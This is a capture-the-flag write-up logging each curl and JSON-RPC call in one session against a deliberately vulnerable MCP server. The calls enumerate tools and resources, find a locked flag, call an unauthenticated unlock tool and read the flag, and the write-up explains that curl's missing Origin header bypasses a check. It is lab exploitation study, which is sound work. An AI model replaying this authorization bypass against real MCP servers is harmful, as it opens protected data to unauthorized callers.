# Level 7 — Master of Resources: live re-run, every call

*ARKX Advanced #7, `ctf.arkx.ninja/level/7` · all `curl` and JSON-RPC calls from one terminal session,
in order · results summarized, not pasted in full.*

Raw evidence: [L7_live_session.txt](L7_live_session.txt). Calls 4 onward use the session id from
call 2; every call carries the same four session cookies (`$CK`). The paste holds **17** shell command
lines: the 16 requests below, plus the one-line `rpc()` helper definition
(`rpc() { curl -s -X POST "$MCP" -b "$CK" … -d "$1"; }`), which is set-up rather than a call — hence 16 rows.

| # | Payload (exactly as sent) | Purpose | Observed result |
|---|---|---|---|
| 1 | `curl -s -b "$CK" "$BASE/level/7/status"` | Pre-flight: is the level reachable with the copied cookies? | Level 7, `accessible:true`, already `completed:true` in this container, `session_id` `9b031a20e155`. |
| 2 | `curl -s -D h.txt -X POST "$MCP" … -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"manual","version":"1.0"}}}'` | Open an MCP session (no `Origin` header) and capture the session id from the response headers. | `serverInfo` `Weather` `1.27.0`; response header `mcp-session-id: 07b6dd0744e04b3e84a9bfbc0b6b0b1f`. |
| 3 | `curl -s -D h.txt -X POST "$MCP" … -d '{"jsonrpc":"2.0","id":1,"method":"initialize","params":{"protocolVersion":"2024-11-05","capabilities":{},"clientInfo":{"name":"manual","version":"1.0"}}}'` (run again, unchanged) | Re-open a session (the `-D h.txt` header dump is overwritten; a second session is created). | Identical `serverInfo` frame; the paste shows no second `mcp-session-id` line, so `$SID` still held the id from call 2. |
| 4 | `rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'` | Enumerate the advertised tools. | One tool: `unlock_flag`, "Unlocks the flag resource, allowing it to be accessed." (input and output schemas returned). |
| 5 | `{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{...}}]}}` | *(shell accident — the previous response was pasted back into the terminal)* | `jsonrpc:2.0,id:2,result:{tools:[name:unlock_flag]}: command not found` — nothing was sent to the server. |
| 6 | `rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'` | Retry after the bad paste. | Same single-tool result as call 4. |
| 7 | `{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"unlock_flag","description":"Unlocks the flag resource, allowing it to be accessed.","inputSchema":{"properties":{},"title":"unlock_flagArguments","type":"object"},"outputSchema":{...}}]}}` | *(shell accident, second occurrence)* | `command not found` again; no request sent. |
| 8 | `rpc '{"jsonrpc":"2.0","id":2,"method":"tools/list"}'` | Third run, clean. | Same single-tool result; `unlock_flag` only. |
| 9 | `rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'` | Enumerate the resource catalogue — the disclosure that matters. | Two resources: `resource://flag` and `resource://super-secret` ("Returns the super secret to the user"). |
| 10 | `rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}' \| jq` | Try to parse the reply as JSON. | `jq: parse error: Invalid numeric literal at line 1, column 6` — the body is an SSE frame (`event:` / `data:`), not bare JSON. |
| 11 | `rpc '{"jsonrpc":"2.0","id":3,"method":"resources/list"}'` | Retry without `jq`. | Same two resources. |
| 12 | `rpc '{"jsonrpc":"2.0","id":4,"method":"resources/read","params":{"uri":"resource://flag"}}'` | Read the protected resource in its locked state. | `text` is `flag is locked`. |
| 13 | `rpc '{"jsonrpc":"2.0","id":5,"method":"tools/call","params":{"name":"unlock_flag","arguments":{}}}'` | Call the tool that guards the resource — as the same caller that was just refused. | `Flag has been unlocked! You can now access the flag resource.`, `isError:false`. No arguments, no authorization. |
| 14 | `rpc '{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"resource://flag"}}'` | Read the same resource again. | `You did it! the flag is: flag-841bcd`. |
| 15 | `tmux capture-pane -p` | *(terminal housekeeping, not a request — capture the pane)* | No output shown in the paste. |
| 16 | `rpc '{"jsonrpc":"2.0","id":6,"method":"resources/read","params":{"uri":"resource://flag"}}'` | Repeat call 14 to confirm the read is stable and re-print the flag. | `You did it! the flag is: flag-841bcd` — identical. |

**What this run shows.** Calls 9 → 12 → 13 → 14 are the whole finding again: the catalogue advertises the
protected resource, the read is refused by a lock, the guard tool the *same* caller may invoke removes it,
and the next read returns the flag. Three details are new or sharper here:

- **No `notifications/initialized` was sent.** `tools/list` worked straight after `initialize`, so the
  handshake notification the SDK expects was optional — fewer steps than the manual guide assumes.
- **No `Origin` probe in this run.** `curl` never sends `Origin`, which is exactly why it is the bypass;
  calls 2–3 succeeded with no `403` to route around.
- **`flag-841bcd` is a third distinct value** for the same level, next to `flag-d39d05` (this session's
  earlier run) and `flag-2016fe` (documented reproduction) — flags are per-container, the technique is not.

Not exercised in this session: the `submit-flag` call, the `resource://super-secret` read, the
`DELETE` session cleanup, and the unauthenticated `302`/`405` gate probes.
